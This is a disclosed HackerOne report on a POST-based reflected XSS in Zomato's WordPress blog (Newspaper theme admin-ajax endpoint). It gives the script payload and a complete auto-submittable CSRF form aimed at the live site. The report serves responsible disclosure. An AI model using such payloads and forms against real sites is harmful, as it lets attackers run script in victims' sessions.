# [Zomato's Blog] POST based XSS on https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2

## Report Details
- **Report ID**: 335481
- **URL**: https://hackerone.com/reports/335481
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-04-10T14:28:29.207Z
- **Disclosed**: 2018-04-26T12:12:14.056Z

## Reporter
- **Username**: inferno-
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
##Issue details:
POST based XSS 

##Vulnerable URL:
https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2

##Vulnerable Parameter:
loopState[moduleId]

##Payload:
<svg><script>prompt&#40;document.domain)</script>

##Steps to reproduce:
* As this is a post based you need to create a html csrf to trigger xss.
* HTML code is below..

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2" method="POST">
      <input type="hidden" name="action" value="td&#95;ajax&#95;loop" />
      <input type="hidden" name="loopState&#91;sidebarPosition&#93;" value="" />
      <input type="hidden" name="loopState&#91;moduleId&#93;" value="&lt;svg&gt;&lt;script&gt;prompt&amp;&#35;40&#59;document&#46;domain&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="loopState&#91;currentPage&#93;" value="2" />
      <input type="hidden" name="loopState&#91;max&#95;num&#95;pages&#93;" value="4" />
      <input type="hidden" name="loopState&#91;atts&#93;&#91;category&#95;id&#93;" value="479" />
      <input type="hidden" name="loopState&#91;atts&#93;&#91;offset&#93;" value="2" />
      <input type="hidden" name="loopState&#91;ajax&#95;pagination&#95;infinite&#95;stop&#93;" value="3" />
      <input type="hidden" name="loopState&#91;server&#95;reply&#95;html&#95;data&#93;" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

* Save this as a .html file.
* Open that html file, it will trigger xss.

##POC:
Screenshot and necessary files are enclosed in attachment.

## Impact

Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.

## Attachments
- zomato_xss.html
- xss.png
